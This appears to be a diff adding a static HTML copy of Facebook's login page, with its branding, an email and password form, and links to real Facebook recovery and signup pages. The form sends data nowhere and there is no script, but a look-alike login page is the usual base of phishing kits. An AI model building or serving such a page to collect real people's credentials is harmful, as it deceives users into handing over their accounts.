@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="icon" type="image/icon" href="img/logo.ico">
+	<title>Log in to Facebook</title>
+
+	<style>
+		body{
+			background-color: #f0f2f5;
+			background-position-x: 50%;
+			background-position-y: 50%;
+		}
+		#div1{
+			text-align: center;
+			margin-top: 40px;
+		}
+		#div2{
+			background-color: #ffffff;
+			width: 396px;
+			height: 305px;
+			padding: 0 0 12px 0;
+			text-align: center;
+			margin: auto;
+			border: 1px solid #dddfe2;
+			border-radius: 8px;
+			box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+		}
+		#span1{
+			font-size: 18px;
+			line-height: 30px;
+			text-align: center;
+			font-family: Arial;
+		}
+		#input1{
+			color: rgb(29, 33, 41);
+			font-size: 16px;
+			padding: 0px 16px;
+			border-radius: 6px;
+			line-height: 48px;
+			width: 332px;
+			border: 1px solid rgb(221, 223, 226);
+
+		}
+		#button1{
+			background-color: rgb(24, 119, 242);
+			color: #ffffff;
+			font-size: 20px;
+			width: 366px;
+			padding: 0px 16px;
+			border: none;
+			border-radius: 6px;
+			line-height: 48px;
+			font-weight: bold;
+		}
+		#button1:hover{
+			cursor: pointer;
+			opacity: 0.9;
+		}
+		#a1{
+			color: #1877f2;
+			font-family: Arial;
+			font-size: 14px;
+			text-decoration: none;
+		}
+		#a1:hover{
+			text-decoration: underline;
+		}
+		#div3{
+			background-color: #ffffff;
+		}
+	</style>
+
+</head>
+
+<body>
+
+	<div id="div1">
+		<a href="https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY5NTY0NDk3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">
+			<img src="img/facebook.svg" width="260px" height="84px"/>
+		</a>
+	</div>
+
+	<div id="div2">
+	<form>
+		
+		<br>
+		<span id="span1">Log in to Facebook</span>
+		<br/><br/>
+		
+		<input id="input1" type="text" placeholder="Email address or phone number" name="Email" required/>
+		<br/><br/>
+
+		<input id="input1" type="Password" placeholder="Password" name="Password" required/>
+		<br/><br/>
+
+		<button id="button1" type="submit" name="login">Log in</button>
+		<br/><br/>
+
+		<div>
+			<a id="a1" href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Forgotten account?</a> · 
+			<a id="a1" href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign up for Facebook</a>
+		</div>
+
+	</form>
+	</div>
+
+<!-- <br><br><br><br>
+<div id="div3"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br></div> -->
+</body>
+</html>
